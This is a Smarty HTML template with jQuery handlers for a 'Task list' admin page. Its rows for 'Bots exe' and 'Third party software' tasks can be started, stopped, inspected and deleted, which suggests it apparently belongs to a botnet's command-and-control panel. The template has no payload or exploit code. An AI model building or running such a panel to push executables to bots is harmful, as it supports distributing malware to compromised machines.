<h1>Task list</h1>
<table style="border: 1px solid lightgray; font-size: 9px; border-collapse: collapse; background-color: rgb(255, 255, 240); width: 700px;" border="1" cellpadding="3" cellspacing="0">
<th style='width:30px;'>#</th>
<th style='width:40px;'>ID</th>
<th style='width:30px;'>Type</th>
<th>Note</th>
<th style='width:130px;'>Date</th>
<th style='width:40px;'>Control</th>
<th style='width:20px;'>Info</th>
<th style='width:20px;'>Stat</th>
<th style='width:20px;'>Del</th>

{foreach from=$TASKS item=TASK name=tasks}
	<tr id='t{$TASK.tskId}'>
	<td style='text-align:center;'>{$smarty.foreach.tasks.iteration}</td>
	<td style='text-align:center;'>{$TASK.tskId}</td>
	<td align='center'><img src='img/{if $TASK.fType=='b'}icos/botsexe_16px.png{elseif $TASK.fType=='c'}icos/settings_16px.png{else}icos/thirdpartysoftware_16px.png{/if}' title='{if $TASK.fType=='b'}Bots exe{elseif $TASK.fType=='c'}Settings{else}Third party software{/if}'></td>
	<td>{$TASK.tskComment}</td>
	<td align='center'>{$TASK.tskDate}</td>
	<td align='center'>
	{if $TASK.tskState==1}
		<div style='cursor:pointer;' id='playstop{$TASK.tskId}' onClick='PlayStop({$TASK.tskId})'><img src='img/icos/stop_16px.png' title='Stop'></div>
	{else}
		<div style='cursor:pointer;' id='playstop{$TASK.tskId}' onClick='PlayStop({$TASK.tskId})'><img src='img/icos/play_16px.png' title='Play'></div>
	{/if}</td>
	<td align='center'>
		<img src='./img/icos/info.png' title='Task #{$TASK.tskId} Info' onClick='load2("./mod/task_info.php?tid={$TASK.tskId}","task_info");'>
	</td>
	<td align='center'>
		<img src='./img/icos/stat.png' title='Task #{$TASK.tskId} Info' onClick='load2("./mod/stat_b_sub_graph.php?tid={$TASK.tskId}","task_info");'>
	</td>	
	<td align='center'>
		<a href="javascript:void();" onclick="if (!confirm('Do you really want to delete this task?')) return false; 
		DeleteTask({$TASK.tskId}); return false;"><img src='./img/icos/delete.png'></a></td>
	</tr>
{foreachelse}
	<tr><td colspan='9' class='error' align='center'>There are no tasks</td></tr>
{/foreach}
</table>

<div id='actions' class='error'></div>
<div id='task_info'></div>

{literal}
<style>
img {border:0px; vertical-align:middle;}
</style>

<script>
function DeleteTask(id)
{
	var el = document.getElementById('t' + id);
	if (el) el.innerHTML = '';
	load('./mod/task_del.php?del=' + id, 'task_info');
}
function PlayStop(id)
{ 
	status = $('#playstop'+id).html();
	if( status.indexOf('stop') != -1)
	{
		$('#playstop'+id).html("<img src='img/icos/play_16px.png' title='Play'>");
		$('#actions').load('./mod/task_playstop.php?ps=0&task='+id, 'actions');
	}
	else
	{
		$('#playstop'+id).html("<img src='img/icos/stop_16px.png' title='Stop'>");
		$('#actions').load('./mod/task_playstop.php?ps=1&task='+id, 'actions');
	}
}
</script>
{/literal}